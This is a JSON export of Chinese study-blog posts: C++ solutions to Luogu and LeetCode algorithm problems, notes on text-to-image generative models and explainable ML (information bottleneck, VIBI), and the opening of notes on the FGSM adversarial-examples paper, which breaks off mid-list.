[{"title":"luogu_1","url":"/post/9c1a1a1.html","content":"\n实践证明如果是要准备机试，只练leetcode是完全不够的！(╯▔皿▔)╯\n\n<!--more-->\n\n# 【模板】并查集\n\n## 题目描述\n\n如题，现在有一个并查集，你需要完成合并和查询操作。\n\n## 输入格式\n\n第一行包含两个整数 $N,M$ ,表示共有 $N$ 个元素和 $M$ 个操作。\n\n接下来 $M$ 行，每行包含三个整数 $Z_i,X_i,Y_i$ 。\n\n当 $Z_i=1$ 时，将 $X_i$ 与 $Y_i$ 所在的集合合并。\n\n当 $Z_i=2$ 时，输出 $X_i$ 与 $Y_i$ 是否在同一集合内，是的输出 \n `Y` ；否则输出 `N` 。\n\n## 输出格式\n\n对于每一个 $Z_i=2$ 的操作，都有一行输出，每行包含一个大写字母，为 `Y` 或者 `N` 。\n\n## 题解\n\n对于此种频繁进行合并集合的要求，使用并查集可加快效率，即同一集合的两个数字的根父节点应相同\n\nstep1：每个数字的初始父节点为其本身\n\nstep2：需要合并两个数字时，首先寻找两个数字的根父节点，如果不同，就将其中一个根父节点的父节点更改为另一个的父节点\n\n```c++\nparent[find_p(x)] = find_p(y)\n```\n\nstep3：判断两个数字是否属于同一集合，就是判断其根父节点是否相同\n\n## 代码\n\n```c++\n#include<bits/stdc++.h>\nusing namespace std;\n\nint n, m;\nvector<int> parent;\n\nint find_p(int x){\n    while(parent[x] != x){\n        x = parent[x];\n    }\n    return x;\n}\nvoid union_p(int x, int y){\n    int p_x = find_p(x);\n    int p_y = find_p(y);\n    if(p_x != p_y){\n        parent[p_x] = p_y;\n    }\n}\n\nint main(){\n    cin >> n >> m;\n    parent.resize(n + 1, 0);\n    for(int i = 1; i <= n; i++){\n        parent[i] = i;\n    }\n    while(m--){\n        int z, x, y;\n        scanf(\"%d%d%d\", &z, &x, &y);\n        if(z == 1){\n            union_p(x, y);\n        }else if(find_p(x) != find_p(y)){\n            printf(\"N\\n\");\n        }else{\n            printf(\"Y\\n\");\n        }\n    }\n}\n```\n\n# 【模板】排序\n\n## 题目描述\n\n将读入的 $N$ 个数从小到大排序后输出。\n\n## 输入格式\n\n第一行为一个正整数 $N$。\n\n第二行包含 $N$ 个空格隔开的正整数 $a_i$，为你需要进行排序的数。\n\n## 输出格式\n\n将给定的 $N$ 个数从小到大输出，数之间空格隔开，行末换行且无空格。\n\n## 思路\n\n快速排序（前序遍历思想），首先选择一个枢轴，将数组分为前中后三部分，前为小于枢轴部分，中为等于枢轴部分，后为大于枢轴部分，然后分别再对前部分和后部分进行快速排序\n\n## 代码\n\n```c++\n#include <bits/stdc++.h>\nusing namespace std;\n\nint n;\nint b[100001], m[100001], l[100001];\nvoid quick_sort(int s, int e, vector<int> &a) {\n    if (s >= e) return;\n    // 随机选择一个枢轴并交换到起始位置\n    int pivot_index = s + rand() % (e - s + 1);    \n    int q = a[pivot_index];\n    int b_i = 0, m_i = 0, l_i = 0;\n    for(int i = s; i <= e; i++){\n        if(a[i] > q) b[b_i++] = a[i];\n        else if(a[i] < q) l[l_i++] = a[i];\n        else m[m_i++] = a[i];\n    }\n    int a_i = s;\n    for(int i = 0; i < l_i; i++) a[a_i++] = l[i];\n    for(int i = 0; i < m_i; i++) a[a_i++] = m[i];\n    for(int i = 0; i < b_i; i++) a[a_i++] = b[i];\n    quick_sort(s, s + l_i - 1, a);\n    quick_sort(e - b_i + 1, e, a);\n}\n\nint main() {\n    scanf(\"%d\", &n);\n    vector<int> a(n);\n    for (int i = 0; i < n; i++) {\n        scanf(\"%d\", &a[i]);\n    }\n    quick_sort(0, n - 1, a);\n    for (int i = 0; i < n - 1; i++) {\n        printf(\"%d \", a[i]);\n    }\n    printf(\"%d\\n\", a.back());\n}\n```\n\n# 【模板】堆\n\n## 题目描述\n\n给定一个数列，初始为空，请支持下面三种操作：\n\n1. 给定一个整数 $x$，请将 $x$ 加入到数列中。\n2. 输出数列中最小的数。\n3. 删除数列中最小的数（如果有多个数最小，只删除 $1$ 个）。\n\n## 输入格式\n\n第一行是一个整数，表示操作的次数 $n$。  \n接下来 $n$ 行，每行表示一次操作。每行首先有一个整数 $op$ 表示操作类型。\n- 若 $op = 1$，则后面有一个整数 $x$，表示要将 $x$ 加入数列。\n- 若 $op = 2$，则表示要求输出数列中的最小数。\n- 若 $op = 3$，则表示删除数列中的最小数。如果有多个数最小，只删除 $1$ 个。\n\n## 输出格式\n\n对于每个操作 $2$，输出一行一个整数表示答案。\n\n## 思路\n\n小根堆，队头元素小，队尾元素大\n\n## 代码\n\n```c++\n#include<bits/stdc++.h>\nusing namespace std;\nint n;\npriority_queue<int, vector<int>, greater<int>> pq;\n\nint main(){\n    scanf(\"%d\", &n);\n    int op;\n    while(n--){\n        scanf(\"%d\", &op);\n        if(op == 1){\n            int num;\n            scanf(\"%d\", &num);\n            pq.push(num);\n        }else if(op == 2){\n            printf(\"%d\\n\", pq.top());\n        }else{\n            if(!pq.empty()) pq.pop();\n        }\n    }\n}\n```\n\n","tags":["c","c++"],"categories":["数据结构"]},{"title":"T2I","url":"/post/7684f23b.html","content":"\n### Framework\n\n<img src=\"T2I/1727072275056201.png\" alt=\"img\" style=\"zoom:33%;\" />\n\n<!--more-->\n\n### 类型\n\n1. Text -> 生成式AI -> video/image\n2. Image -> 生成式AI -> text\n3. Image -> 影像完善/风格转换/质量提升 -> new image                影像生影像\n4. Voice + image -> 生成式AI -> video               talking head\n\n### 基础要点\n\n Image -> consisted of patches(像素点, eg:1024 * 1024)              video -> consisted of frame(eg: frame per second -> FPS)\n\n高精度图像要点：一些影像压缩技术\n\n对于图片：\n\n<img src=\"T2I/1727072275054175.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n对于视频：\n\n<img src=\"T2I/1727072275054176.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n##### 方法\n\n文字生图需要大量训练资料，有网站提供大量图片文字对，因此文字生图主要目标可理解为：\n\n输入：文字 ----> 输出：patches\n\n1. One method is generating patch sequently(auto-regressive)，很少用，patch之间不是依次传递作用:\n\n<img src=\"T2I/1727072275054177.png\" alt=\"img\" style=\"zoom:33%;\" />\n\n1. 进化方式：同时生成patch，难以避免patch之间衔接不够，假如目标是生成一只小狗，这种方式可能导致各个patch的目标都是生成小狗，导致最终图像混乱，或者各个patch之间的杂序未统一，同一张图出现风格不同\n\n<img src=\"T2I/1727072275054178.png\" alt=\"img\" style=\"zoom:33%;\" />\n\n1. 对于一些有独特特点的图片，比如一定要包含某个无法用语言完全描述的物品时，可使用个人化的图像生成，加入到图像生成中\n   1. <img src=\"T2I/1727072275054179.png\" alt=\"img\" style=\"zoom:33%;\" />\n2. 文字生影片，方法和上面第二点相似，传入的即为P1.1 P1.2，生成的也还是patches，多个patches可组成一个frame\n   1.  挑战：假设FPS为24，image为64*64，1分钟有1440个frame，600w个patch\n\n   2. 每两个patch之间都相互考虑做attention，需要600w * 600w ->36兆次attention\n   3. Temporal attention:不同frame中相同位置的patch才做attention -> 1440^2 * (64*64) -> 85亿次attention\n   4. Spatial attention:同一个frame中所有的patch才做attention -> (64*64)^2 * 1440 ->240亿次attention\n\n##### 衡量方式\n\n1. **clip score**:contrastive language-Image pre-training:有400million的text-image对，方法如下，正确配对->高分，错误配对 -> 低分，正确样本为官方数据，负样本为随机打乱text-image对\n\n<img src=\"T2I/1727072275054180.png\" alt=\"img\" style=\"zoom:33%;\" />\n\n1. **FID:** 先有一个pretrain好的cnn model，用于影像分类，将真实的latent representation和生成图片的latent representation进行比较（需要大量样本）\n\n<img src=\"T2I/1727072275054181.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n### 经典方法\n\n##### Variational Auto-Encoder(VAE)\n\n- 挑战：一张image由多个patch组成，patch之间虽然能用attention相互影响，无法避免patch之间风格不一致，无法统一(因为model本身就需要联想)\n- 解决方案：添加标注，即资讯\n  - <img src=\"T2I/1727072275054182.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n  -  模型训练（将资讯抽取和图像生成一起进行训练优化，先根据图像生成资讯/标注，再根据标注生成图像，尽量使得生成的image和原始的image足够相似），该过程称之为auto-encoder\n\n  - <img src=\"T2I/1727072275054183.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n  -  图像生成时标注是随机生成并加入到图像生成的模型中，最终生成图片，因为抽取的标注一般不为文字，而是向量，不同位置数字代表不同信息，因此真实生成图片是标注可随机产生，即随机确定风格\n- 进阶使用\n  -  在通过encoder获取到的标注可以自行增减向量，比如原始图片为笑脸，可在生成的标注中减去笑脸向量，加上臭脸向量，在生成图片，最终生成的图片即为臭脸\n\n##### Flow-based\n\n- 要点：和VAE类似，不同之处在于，Flow将资讯抽取当作图像生成的反过程，即VAE中的Encoder为Decoder^-1，这就要求Decoder f函数要有反函数\n  - <img src=\"T2I/1727072275054184.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n##### Diffusion\n\n- 模型框架（分为forward和reverse两部分）\n  - <img src=\"T2I/1727072275055185.png\" alt=\"img\" style=\"zoom:50%;\" />\n- Reverse Process：Noise image为随机生成的和target image尺寸一致的噪声图片，step后面的数字是和Forward过程相对应的，该图相当于做了1000次的Denoise，目的是一步步过滤掉noise image中的噪声\n  - <img src=\"T2I/1727072275055186.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n  - Denoise细节：由于每一步传入的image噪声程度不同，即随着不断地Denoise，图片的噪声会不断减少，因此添加新的输入用于表示noise严重程度\n    -   另外Denoise的方法是先为输入的noise image生成一个纯noise，再将输入的noise image减去预测出的noise，最终得到该步的输出\n\n    - <img src=\"T2I/1727072275055187.png\" alt=\"img\" style=\"zoom:50%;\" />\n- Forward Process(diffusion model)：即Noise predictor训练过程，首先将一张干净的图不断的加噪声，最终生成一张noise image\n  - <img src=\"T2I/1727072275055188.png\" alt=\"img\" style=\"zoom:33%;\" /><img src=\"T2I/1727072275055189.png\" alt=\"img\" style=\"zoom:33%;\" />\n\n  - \n\n  -  然后将数据用于noise predictor训练，这里的2是noise程度，即image2-noise2 = image1，达到上面的reverse效果\n- 结合text：即denoise增加输入text，相应的forward过程也要加入text\n  - <img src=\"T2I/1727072275055190.png\" alt=\"img\" style=\"zoom:50%;\" />\n- 完整框架\n  - <img src=\"T2I/1727072275055191.png\" alt=\"img\" style=\"zoom:50%;\" />\n- 训练\n  - noise predictor过程(forward)\n    - <img src=\"T2I/1727072275055192.jpeg\" alt=\"img\" style=\"zoom: 33%;\" /><img src=\"T2I/1727072275055193.jpeg\" alt=\"img\" style=\"zoom:33%;\" />\n\n    - \n  - reverse过程\n  - <img src=\"T2I/1727072275055194.jpeg\" alt=\"img\" style=\"zoom:33%;\" /><img src=\"T2I/1727072275055195.jpeg\" alt=\"img\" style=\"zoom:33%;\" />\n\n  - \n\n  - \n\n实际上的noise是一次性直接生成的，而不是逐步添加杂序\n\n- 代码细节：\n  -  怎么衡量output image和真实image之间的接近度->最大似然估计，即输出图片为预期图片的概率的乘积最大的网络参数\n\n  - <img src=\"T2I/1727072275055196.jpeg\" alt=\"img\" style=\"zoom:33%;\" />\n\n  -  首先看VAE过程，目标是最小化输出G(z)和目标x之间的差距，然后找logP(x)的下界\n\n  - <img src=\"T2I/1727072275055197.jpeg\" alt=\"img\" style=\"zoom:33%;\" />\n\n  -   类似的DDPM过程，确定logP(x)的下界\n\n  - <img src=\"T2I/1727072275055198.jpeg\" alt=\"img\" style=\"zoom:33%;\" />\n\n  -  计算过程\n\n  - <img src=\"T2I/1727072275056199.jpeg\" alt=\"img\" style=\"zoom:33%;\" />\n\n##### GAN(可作为一种外挂，即VAE+GAN, Flow+GAN, Diffusion+GAN)\n\n和其他模型有本质区别(Discriminator来衡量生成图像的好坏，类似于clip)\n\n训练方式：搜集大量的image-text pair作为正样本，准备一个不好的文生图模型，将text和生成的image配对作为负样本\n\n![img](T2I/1727072275056200.png)\n","tags":["Python"],"categories":["安全"]},{"title":"Explainable_ML","url":"/post/e4cc0182.html","content":"\n#### Explainable ML\n\n产生原因：预测正确 != 模型有效，即**希望模型能给出预测结果的支撑原因**，深度神经网络对我们是一个黑盒结构，不能直接解释其结果\n\n<!--more-->\n\n##### Interpretable vs powerful\n\n成反比，越简单的模型解释性越强，能力越差 eg：linear model，每一个权重都有独特的含义，可用于支撑结果\n\n越复杂的模型解释性越差，能力越强 eg：deep neural(black box)\n\n> Explainable: which is a black box, to give it the capacity for explaining\n>\n> Interpretable: which is not a black box, we can gain its interpretation\n\n##### Suitable choice\n\n决策树：比线性模型能力更强，比深度神经网络更好解释。每一个节点都对应不同的问题（即特征）\n\n**但是**，实际场景中，决策树用于随机森林，由多个决策树组成，难以确认模型如何确定结果\n\n##### Type\n\n- Local explaination: 即本论文所介绍的方式，即针对单个样本的解释（eg：为什么识别出图片a是数字1）\n  - 方法1： 移除图片单个component，确定哪个component会影响预测结果（**缺点**：component过多的时候过于复杂）\n  - 方法2：计算梯度：原始样本X={x1,x2,...xn...xN}--->X={x1,x2,...xn+▲x,...xN}，Jloss` = Jloss + ▲e,xn的重要性为|▲e/▲x|，我们能获得一张saliency map，每一个node代表了其重要性（**缺点1**：不可避免的噪声，即重点不突出，存在过多的\"杂质\"(用smoothGrad,对输入图片加噪声，计算map平均值)，**缺点2**：梯度并不能总是反映重要性，即存在这种情况： when x-->[0,x'],梯度大，when x-->[x' ,+∞]，梯度小，无法确定该特征是否影响结果）\n- Global explaination：即针对预测结果的解释（eg：什么样的图片会被识别出为数字1）\n  - 方法1：生成一个样本，希望模型识别出我们想要的效果（样本即为待优化参数）\n  - 方法2：计算梯度上升点，但是生成的样本很有可能不符合预期（过多杂质）\n  - 方法3：use a generator：input-Z(low-dim), X = G(Z), Y = D(X), 目标是min(y,yi)\n\n##### More info\n\n提升深度神经网络的可解释性是有挑战的，一种方式是训练一个更简单的解释模型(eg：linear)来模仿原始模型，确定哪些特征对模型结果产生重要影响（LIME）\n\n#### Information bottleneck theory\n\n- 互信息\n  - 信息熵概念：每一件信息（事件）都有其价值，eg:从多个候选中选择答案，如果是两个候选者，选中的概率是1/2(只需要询问一次就可以获得结果，I = 1)，如果是四个候选者，选中的概率是1/4(要询问两次获得结果，I = 2)，如果是八个候选者，选中的概率是1/8(要问三次获得结果，I = 3)，因此一条信息的价值I近似为I = -log2(P)，概率越大，信息价值越小，概率越小，信息价值越大，也可称为不确定性。\n    -   信息熵就是I的期望，H = ΣI*P，如果一个系统是由大量小概率事件组成，其信息熵越大，代表其不确定性越大1\n  - 联合熵概念：X和Y并不独立，I(xi, yj) = -log2(P(xi, yj))，H(X,Y) = -ΣΣP(xi, yj) * log2(P(xi, yj))\n    -   条件熵概念：H(X|Y)：在Y事件发生后，X事件的不确定性，即X和Y的联合熵减去Y事件本身的信息熵，就是Y发生前提下，X事件发生带来的新信息熵，H(X|Y) = H(X, Y) - H(Y)\n  - 互信息概念（I(X; Y)）:I(X; Y) = H(X) - H(X|Y) = ΣP(x, y) * log2(P(x, y)/(P(x) * P(y)))，即X本身的信息熵减去Y发生后X发生带来的新的信息熵，就是X和Y的联合信息，通常来说，Y确定后，X的不确定性越大，X与Y的互信息就越少；Y确定后X越确定，X越Y的互信息越大\n- 信息瓶颈理论：将神经网络视为一个encoder（X->Z）+decoder(Z->Y),目标是min(I(Z; X) - β*I(Z; Y)), 目标参数是P(Z|X)，即找到最合适的Z，最小化Z和X之间的互信息，最大化Z和Y的互信息，**主要思想：**将多层神经网络是为逐层传递的马尔科夫链，信息在链中被逐层压缩，去掉和输出无关的，留下和输出相关的。也就是说每一层与模型输入的互信息在逐渐减少，与模型输出的互信息逐渐增大\n- 马尔科夫链：在当前条件确定情况下，未来的情况发生只取决于当前情况，和过去独立(I(X; Y|Z) = 0)\n- KL散度：小概率事件包含着更大的信息价值，熵是指一个概率分布的平均信息量，用于衡量不确定性，交叉熵就是给定估计的分布概率q（预测出的）,假设真的发生的分布概率是p, 交叉熵H(p, q) = Σ pi * I(qi)，也就是真实发生的概率乘以估计的分布概率的价值，KL散度就是一种衡量真实熵和交叉熵之间的差距的方式：D(p||q) = H(p, q) - H(p) = Σpi*log(pi)/qi\n  - KL散度大于等于0，只有当p=q等号成立\n  - D(p||q) != D(q||p)\n  - 通常使用crossentropy作为损失函数，因为我们损失函数的目的最终是梯度下降，▽D(p||qΘ) = ▽ΘH(p, q) - ▽ΘH(p) = ▽ΘH(p, qΘ)\n  - 散度越小，概率越接近\n\n#### VIBI(Local Explaination)\n\n目标是既要能充分解释，又要足够简介\n\n方法——explainer(返回每个样本被选择的概率Z,输出为T(X)=Zj*Xi)+approximator（根据解释器的输出T，模仿真实模型预测结果对模型进行训练）\n\n现有方法——1. 针对特别的模型所构建的explainer，比如background和CNN 2.针对所有模型都可以（提供一个模型近似器）\n\n##### Method\n\n原始的信息瓶颈目标公式为 P(t|x) = argmax I(t; y) - β * I(x;t)(待优化变量：p(t|x), p(y|t), p(t))\n\n优化目标公式为P(Z|X) = argmax(p(z|x), p(y|t)) I(t; y) - β * I(X; t)（没有p(t)的原因我猜测是因为在原始马尔科夫假设中，p(t)是表示t的边际分布，捕捉了所有可能的表示分布，但是在VIBI中，通过explainer得到了一个更具体的表示t，因此p(t)被具体的选择过程p(z|x)取代，即t由解释器P(z|x)优化，不需要再单独优化\n\n**难点**：I(x; t)和I(y; t)难以直接确认，联合分布维数过高，计算代价大\n\n首先可确定的是I(x; t)小于I(x; Z) + c(信息在传递过程是递减的，t由z和x联合计算得到，t所包含的信息是由z和x共同传递，因此t和x的信息量小于x和z的互信息量)，推理过程如下，由此，以上公式下界为以下，目标就是最大化以下\n\n其中先验分布为均匀分布（1/length），原因如下：\n\n1. 均匀分布假设每个特征都有相同的概率被选择，即每个特征在初始状态下是等价的。这种分布可以被视为对模型没有特定偏见的表示，保留了特征之间的潜在信息。如果使用全零向量作为先验，这意味着你假设所有特征的选择概率都是零，或者说你假设特征在初始状态下都没有信息价值。这样做会导致KL散度的值很大，因为 `log_p_i` 会与这个全零先验产生极大的差异，模型可能难以有效训练。\n2. 在反向传播时，均匀分布能提供一个合理的梯度，使得 `log_p_i` 在训练过程中逐步调整，向更有意义的特征分布靠近。因为均匀分布给出的梯度不是极端的，所以有助于稳定训练。使用零向量可能会导致梯度的极端值，尤其是在KL散度的计算中。极端的梯度可能会导致训练过程中的数值不稳定，甚至梯度爆炸或消失，阻碍模型的正常学习。\n3. 使用均匀分布作为先验，可以让模型从一个中立的起点开始学习，即假设每个特征最初都具有相同的重要性。这使得模型在初期阶段不会对某些特征产生偏见，从而增强了模型的泛化能力。如果使用全零向量，模型可能会被迫从一个不合理的假设出发，这可能导致过度依赖某些特征或无法充分利用所有可用信息。这样可能削弱模型的泛化能力，并导致较差的性能。\n4. 均匀分布先验的假设更接近现实，因为在很多情况下，我们事先并不知道哪些特征更重要，所以均匀分布提供了一个自然的起点，减少了模型的先验偏差。零向量通常假设所有特征在初始时都是无效的，这在很多实际场景中是不合理的，可能会导致训练初期模型学习非常缓慢甚至无法学习。\n\n<img src=\"Explainable-ML/172707213427358.jpeg\" alt=\"img\" style=\"zoom:33%;\" /><img src=\"Explainable-ML/17270721342641.jpeg\" alt=\"img\" style=\"zoom:33%;\" />\n\n**难点**：Pj(x) = P(zj, x)，encoder得到的是Pj(x)，要如何确定Z的值？这里的Z可看作是一个二进制列表，为1代表该块选中，实际上不能通过公式得出zj的值，我们可以通过概率进行随机采样，即使用argmax找到使得概率最大化的zj，但是argmax不可导，gumble-softmax的目标是生成一个以P为参数的公式，公式返回的结果是Z采样的结果，以便于对Z的选择可实现对P微分，可反向传播\n\n即以连续分布去近似离散部分，softmax在一定程度上可近似argmax函数（当τ接近0时，`softmax`的输出近似于一个one-hot向量，其中某一个元素接近1，其余接近0，这与`argmax`的输出一致。）\n\n具体方法分为两步 1. 为每个类别添加噪声（添加随机性，概率低也有可能被选中） 2. 对加噪结果应用softmax，使得结果接近原始类别分布\n\n<img src=\"Explainable-ML/17270721342652.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n根据采样次数进行合并得到Z，我认为是每一次都相当于模拟一个one-hot，要找k个，就计算出k个one-hot,合并就得到最终结果，因此\n\n![img](Explainable-ML/17270721342663.png)\n\n最终的目标函数\n\n![img](Explainable-ML/17270721342664.png)\n\n#### 实验\n\n实验概述：训练出一个识别MNIST手写数字的模型A，查找最影响结果的输入X的四个块\n\n对比实验设计：不进行采样（进行采样获取）和进行采样（直接选择k个概率最大的块）\n\nSame digit, different angles.\n\n![img](Explainable-ML/17270721342665.png)![img](Explainable-ML/17270721342676.png)![img](Explainable-ML/17270721342677.png)![img](Explainable-ML/17270721342678.png)![img](Explainable-ML/17270721342689.png)\n\n![img](Explainable-ML/172707213426810.png)![img](Explainable-ML/172707213426811.png)![img](Explainable-ML/172707213426812.png)![img](Explainable-ML/172707213426913.png)![img](Explainable-ML/172707213426914.png)\n\n![img](Explainable-ML/172707213426915.png)![img](Explainable-ML/172707213426916.png)![img](Explainable-ML/172707213426917.png)![img](Explainable-ML/172707213426918.png)![img](Explainable-ML/172707213426919.png)\n\n![img](Explainable-ML/172707213427020.png)![img](Explainable-ML/172707213427021.png)![img](Explainable-ML/172707213427022.png)![img](Explainable-ML/172707213427023.png)![img](Explainable-ML/172707213427024.png)\n\n![img](Explainable-ML/172707213427025.png)![img](Explainable-ML/172707213427026.png)![img](Explainable-ML/172707213427027.png)![img](Explainable-ML/172707213427128.png)![img](Explainable-ML/172707213427129.png)\n\n![img](Explainable-ML/172707213427130.png)![img](Explainable-ML/172707213427131.png)![img](Explainable-ML/172707213427132.png)![img](Explainable-ML/172707213427133.png)![img](Explainable-ML/172707213427134.png)\n\n![img](Explainable-ML/172707213427135.png)![img](Explainable-ML/172707213427136.png)![img](Explainable-ML/172707213427137.png)![img](Explainable-ML/172707213427238.png)![img](Explainable-ML/172707213427239.png)![img](Explainable-ML/172707213427240.png)\n\n![img](Explainable-ML/172707213427241.png)![img](Explainable-ML/172707213427242.png)![img](Explainable-ML/172707213427243.png)![img](Explainable-ML/172707213427244.png)![img](Explainable-ML/172707213427245.png)![img](Explainable-ML/172707213427246.png)\n\n![img](Explainable-ML/172707213427247.png)![img](Explainable-ML/172707213427248.png)![img](Explainable-ML/172707213427249.png)![img](Explainable-ML/172707213427350.png)![img](Explainable-ML/172707213427351.png)\n\n![img](Explainable-ML/172707213427352.png)![img](Explainable-ML/172707213427353.png)![img](Explainable-ML/172707213427354.png)![img](Explainable-ML/172707213427355.png)![img](Explainable-ML/172707213427356.png)\n\n实验结果如下图\n\n<img src=\"Explainable-ML/172707213427357.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n实验结果：不进行采样获取到的结果随着迭代次数增加效果越来越差，在最后几乎保持不变\n\n进行采样和随机化后的结果准确率迅速达到饱和，且很高\n\n**原因：**1. 随机性的引入 2. 后期变化小，不再进行优化\n","tags":["Python"],"categories":["安全"]},{"title":"leetcode-daily-practice","url":"/post/374aa791.html","content":"\n学习之路任重而道远\n\n<!--more-->\n\n#### [K 周期字符串需要的最少操作次数](https://leetcode.cn/problems/minimum-number-of-operations-to-make-word-k-periodic/)\n\n##### 题目描述\n\n给你一个长度为 `n` 的字符串 `word` 和一个整数 `k` ，其中 `k` 是 `n` 的因数。\n\n在一次操作中，你可以选择任意两个下标 `i` 和 `j`，其中 `0 <= i, j < n` ，且这两个下标都可以被 `k` 整除，然后用从 `j` 开始的长度为 `k` 的子串替换从 `i` 开始的长度为 `k` 的子串。也就是说，将子串 `word[i..i + k - 1]` 替换为子串 `word[j..j + k - 1]` 。\n\n返回使 `word` 成为 **K 周期字符串** 所需的 **最少** 操作次数。\n\n如果存在某个长度为 `k` 的字符串 `s`，使得 `word` 可以表示为任意次数连接 `s` ，则称字符串 `word` 是 **K 周期字符串** 。例如，如果 `word == \"ababab\"`，那么 `word` 就是 `s = \"ab\"` 时的 2 周期字符串 。\n\n**示例 1：**\n\n**输入：**word = \"leetcodeleet\", k = 4\n\n**输出：**1\n\n**解释：**可以选择 i = 4 和 j = 0 获得一个 4 周期字符串。这次操作后，word 变为 \"leetleetleet\" 。\n\n##### 思路\n\n要点1：选择的两个下标要能被k整除，k是word长度的因数，可选择的下标为——0, k, k*2..., word.size() - k\n\n要点2：K周期字符串要以k为周期，即我们每次选择的子串中必有一个会成为最后的循环依据\n\n##### 方法\n\n找到重复次数最多的长度为k的字串数量，将其他不是该字串的更换为该字串即可\n\n##### 代码\n\n```c++\nclass Solution {\npublic:\n    int minimumOperationsToMakeKPeriodic(string word, int k) {\n        unordered_map<string, int> hashmap;\n        int length = word.size();\n        pair<string, int> max_pair(make_pair(\"\", 0));\n        for(int i = 0; i < length; i += k)\n            if(++hashmap[word.substr(i, k)] > max_pair.second) max_pair=make_pair(word.substr(i, k), hashmap[word.substr(i, k)]);\n        return length / k - max_pair.second;\n    }\n};\n```\n\n#### \n","tags":["c","c++"],"categories":["数据结构"]},{"title":"FGSM & PDG","url":"/post/cda691ed.html","content":"\n\n\n## FGSM\n\n论文链接： [[1412.6572\\] Explaining and Harnessing Adversarial Examples (arxiv.org)](https://arxiv.org/abs/1412.6572)[[1412.6572\\] Explaining and Harnessing Adversarial Examples (arxiv.org)](https://arxiv.org/abs/1412.6572)\n\n####  研究点\n\n设计更强大的优化方法，能够在训练过程中有效处理非线性模型的复杂性，从而同时实现训练的易用性和对抗性扰动的抵抗能力\n\n<!--more-->\n\n#### 线性模型中的对抗扰动\n\n1. **对抗扰动的累积效应**：\n   - 假设我们有一个输入向量 $x$ 和一个权重向量 $w$。\n   - 我们施加一个微小的扰动 $η$ 到输入向量 $x$，得到新的输入 $\\tilde{x}=x+\\eta.$。\n2. **权重向量和扰动的点积**：\n   - 对于线性模型，激活值是通过计算权重向量 $w$ 和输入向量 $x$ 的点积得到的，即$\\boldsymbol{w}^\\top\\tilde{\\boldsymbol{x}}=\\boldsymbol{w}^\\top\\boldsymbol{x}+\\boldsymbol{w}^\\top\\boldsymbol{\\eta}$。\n   - 这里 $w^\\top x$是原始激活值，而$w^\\top n$是由扰动引起的激活值变化。\n3. **最大化扰动的影响**：\n   - 为了使激活值变化$w^\\top n$最大化，可以将 $η$ 设置为 $\\mathrm{sign}(w)$，即 $η$ 的每个元素的符号与 $w$ 的对应元素相同。\n   - 这种设置会使得点积 $w^\\top n$ 取得最大值。\n4. **累积效应**：\n   - 如果权重向量 $w$ 有 $n$ 个维度，每个元素的平均值为 $m$，那么总的激活值变化为$\\epsilon mn$。\n   - 这是因为每个小的扰动 $n$ 的元素都被放大了 $m$ 倍，并且有 $n$ 个这样的元素。\n5. **高维度的影响**：\n   - 由于 $η$ 的最大范数$\\|\\eta\\|_{\\infty}$是固定的（即每个元素的最大值是固定的），不会随着维度$n$增加而增加。\n   - 但是，由于$n$增加，累积效应使得总的激活值变化$w^\\top n$可以线性增加。\n6. **意外隐写术**：\n   - 这种现象类似于隐写术，即通过许多小的变化隐藏一个大的变化。\n   - 线性模型会被迫专注于最符合其权重的信号，即使输入数据中存在多个信号且其他信号的幅度更大。\n\n#### 非线性模型的线性特性\n\n非线性模型被有意设计为以非常线性的方式运行\n\n##### LSTM（长短期记忆网络）\n\n###### 公式和结构：\n\nLSTM单元由以下主要部分组成：\n\n- **输入门**：控制有多少新信息被写入记忆单元。\n- **遗忘门**：控制有多少记忆单元中的信息被保留。\n- **输出门**：控制有多少信息从记忆单元输出。\n\nLSTM单元的公式如下：\n\n $\\begin{aligned}\n&i_t=\\sigma(W_i\\cdot[h_{t-1},x_t]+b_i) \\\\\n&f_t=\\sigma(W_f\\cdot[h_{t-1},x_t]+b_f) \\\\\n&o_t=\\sigma(W_o\\cdot[h_{t-1},x_t]+b_o) \\\\\n&\\tilde{C}_t=\\tanh(W_C\\cdot[h_{t-1},x_t]+b_C) \\\\\n&C_t=f_t\\cdot C_{t-1}+i_t\\cdot\\tilde{C}_t \\\\\n&h_t=o_t\\cdot\\tanh(C_t)\n\\end{aligned}$\n\n其中：\n\n- $σ$ 是sigmoid函数，输出范围在(0, 1)之间。\n- $⁡tanh$ 是tanh函数，输出范围在(-1, 1)之间。\n- $i_t$、$f_t$、$o_t$ 分别是输入门、遗忘门和输出门的激活值。\n- $C_t$ 是记忆单元的状态。\n- $h_t$ 是隐藏状态。\n\n###### 线性特性：\n\n- **门控机制**：LSTM通过输入门、遗忘门和输出门控制信息的流动，这些门的输出是线性的（在0到1之间）。这种设计使得信息在较长时间内保持稳定，梯度传递时不会消失或爆炸，从而表现得更为线性。\n\n##### ReLU（整流线性单元）\n\n###### 公式和特性：\n\nReLU的激活函数定义为： $𝑓(𝑥)=max⁡(0,𝑥)$\n\n###### 线性特性：\n\n- **线性部分**：当输入 $𝑥≥0$ 时，ReLU的输出是 $x$，即线性关系；当输入 $𝑥<0$时，输出为0。这使得在大部分情况下，ReLU的输出是线性的，尤其是在正区间内。\n- **避免梯度消失**：与sigmoid和tanh等激活函数相比，ReLU的正区间内梯度为1，不会出现梯度消失的问题，使得优化过程更加高效。\n\n##### Maxout网络\n\n###### 公式和特性：\n\nMaxout单元输出若干线性函数的最大值，具体公式为：\n\n $f(x)=\\max(w_1^\\top x+b_1,w_2^\\top x+b_2,\\ldots,w_k^\\top x+b_k)$\n\n其中：\n\n- $w_i$和 $b_i$ 是可学习的参数。\n- $k$ 是Maxout单元的线性函数数量。\n\n###### 线性特性：\n\n- **线性组合**：Maxout通过输出多个线性函数中的最大值，实现在局部线性化的非线性映射。这种设计使得每个Maxout单元在一小段范围内是线性的。\n- **增强非线性表达能力**：虽然Maxout单元在局部是线性的，但通过组合多个线性函数，整体上可以实现复杂的非线性映射，同时保持优化的稳定性。\n\n#### 初始FGSM\n\n快速梯度符号法\t——\t生成对抗样本\n\n1. **符号说明**：\n   - $θ$：模型的参数。\n   - 